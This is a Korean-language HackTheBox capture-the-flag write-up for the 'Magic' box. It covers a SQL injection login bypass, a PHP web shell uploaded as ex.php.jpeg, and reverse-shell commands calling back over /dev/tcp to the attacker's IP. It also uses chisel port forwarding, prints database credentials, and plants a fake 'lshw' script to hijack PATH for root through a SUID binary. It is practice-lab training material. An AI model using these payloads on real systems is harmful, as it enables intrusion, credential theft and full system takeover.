# Magic - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA magic 10.129.18.99
```
<img width="1105" height="376" alt="image" src="https://github.com/user-attachments/assets/3691b578-acd4-475b-a74c-30365f534359" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
<img width="1105" height="225" alt="image" src="https://github.com/user-attachments/assets/d748faa3-db5a-45ef-ab7e-d3a86ba47da5" />

### Login Bypass
- 메인페이지에서 `Login`링크를 누르면 로그인 페이지로 이동 됨.
- 기본 계정으로 로그인 시도하였으나 실패.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/ab362f9c-0ce2-4697-be9b-6e370151063c" />

<br>
<br>

- 로그인을 실패하였을 때는 알람창이 생성 됨.
- `admin':admin`으로 시도하였을 경우 알람창 생성이 되지 않음.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/f905a513-8087-47ec-823b-fa78f03545d4" />

<br>
<br>

- `admin'or‘1’='1;:admin`으로 로그인 우회.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/28da53fe-fef5-4621-bfca-2ee72736408d" />

### Upload Web Shell
- 이미지 파일 업로드가 가능.
<img width="396" height="79" alt="image" src="https://github.com/user-attachments/assets/d3d85baa-dcc9-42ec-a916-7753ea52b11d" />

<br>
<br>

- 이미지 파일 업로드를 `burpsuite`로 가로챔.
- 이미지의 데이터를 웹 셸 코드로 수정하고 `ex.php.jpeg`로 수정하여 전달.
- 업로드 성공.
<img width="1537" height="569" alt="image" src="https://github.com/user-attachments/assets/004640dc-9a0a-4b36-8ec6-83e093ed9fce" />

<br>
<br>

- 명령어 실행 성공.
<img width="672" height="89" alt="image" src="https://github.com/user-attachments/assets/87c79aec-e299-44c8-b603-b6f80cfbb8e3" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl 'http://10.129.18.99/images/uploads/ex.php.jpeg/?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.14.23%2F80%200%3E%261%22'
```
<img width="1103" height="62" alt="image" src="https://github.com/user-attachments/assets/49b13adc-a344-4b4a-84ec-058aded17d10" />

<br>
<br>

- 셸 획득.
<img width="1103" height="179" alt="image" src="https://github.com/user-attachments/assets/24bfd8ff-d061-46b4-ad7d-118677e2390c" />

---
## Privesc
- `/var/www/Magic`에서 `db.php5` 발견.
<img width="1103" height="231" alt="image" src="https://github.com/user-attachments/assets/340554e3-3326-4dcc-9d44-1d7e6c5efa8d" />

<br>
<br>

- `mysql` 계정 발견.
<img width="1103" height="159" alt="image" src="https://github.com/user-attachments/assets/4074dd86-4342-4b62-8c59-06e68702724e" />

<br>
<br>

- 원격에서 `mysql` 접속 실패.
<img width="1103" height="159" alt="image" src="https://github.com/user-attachments/assets/10f2db20-0e98-4666-a4c7-ce6cb7ac1f6f" />

<br>
<br>

- `chisel`로 포트포워딩.
```bash
./chisel client 10.10.14.23:8000 R:3306:127.0.0.1:3306
```
<img width="1103" height="64" alt="image" src="https://github.com/user-attachments/assets/c4eebbd1-d602-414b-9b91-016274fdabde" />

<br>
<br>

```bash
./chisel server -p 8000 --reverse
```
<img width="1103" height="121" alt="image" src="https://github.com/user-attachments/assets/2973b327-3a80-4b90-bb66-5baec2ec63ba" />

<br>
<br>

- `admin:Th3s3usW4sK1ng` 발견.
```bash
mysql -h127.0.0.1 -utheseus -piamkingtheseus
```
<img width="1103" height="428" alt="image" src="https://github.com/user-attachments/assets/1df5eb63-5bad-4bdb-b0b9-b62809b0d7fa" />

<br>
<br>

- `theseus` 유저 발견.
<img width="1103" height="60" alt="image" src="https://github.com/user-attachments/assets/ee96a8fc-f379-440c-9833-a6a217d261bb" />

<br>
<br>

- `theseus:Th3s3usW4sK1ng` 로그인.
<img width="1103" height="78" alt="image" src="https://github.com/user-attachments/assets/dc023c37-7187-4fb6-9959-313f68f18f6c" />

<br>
<br>

- `/bin/sysinfo`프로그램에 SUID가 설정되어 있음.
```bash
find / -perm -4000 2>/dev/null
```
<img width="1103" height="118" alt="image" src="https://github.com/user-attachments/assets/3a488cc2-96de-43fb-99fc-028a96a31fca" />

<br>
<br>

- `ltrace`가 원격에 존재하여 분석.
-  `popen`함수로 `lshw`와 `fdisk`를 실행.
```bash
ltrace /bin/sysinfo
```
<img width="1103" height="362" alt="image" src="https://github.com/user-attachments/assets/bff11bde-490a-4557-9044-a5bb07000a3a" />

<br>
<br>

<img width="1103" height="58" alt="image" src="https://github.com/user-attachments/assets/fa7aa014-4564-4c31-bf49-c09d3dcd79c2" />

<br>
<br>

- `lshw` 혹은 `fdisk`의 실행위치와 실행 프로그램을 변경할 경우 침투가 가능할 것으로 예상.
- 리버스 셸 프로그램 생성.
```bash
echo '#!/bin/bash' > lshw

echo 'bash -c "bash -i >&/dev/tcp/10.10.14.23/80 0>&1"' >> lshw

chmod 777 lshw
```
<img width="1103" height="515" alt="image" src="https://github.com/user-attachments/assets/28e11a08-128f-4b99-9d8b-eba8b5e64cc0" />

<br>
<br>

- `PATH`에 `/home/theseus` 추가.
```bash
export PATH=/home/theseus:$PATH
```
<img width="1103" height="76" alt="image" src="https://github.com/user-attachments/assets/1b81603a-49fc-4709-842a-de06e65020c3" />

<br>
<br>

- `/bin/sysinfo` 실행하여 `root` 획득.
<img width="1103" height="139" alt="image" src="https://github.com/user-attachments/assets/f20a56c0-ed82-48d8-9e9b-95463aca847d" />

---
## FLAG
- `/home/theseus/user.txt`
<img width="1103" height="478" alt="image" src="https://github.com/user-attachments/assets/8df52701-9aa7-4c5d-8812-d6a68135b1b4" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="270" alt="image" src="https://github.com/user-attachments/assets/b2117a42-e80f-4de6-9d4f-25abda9774c3" />
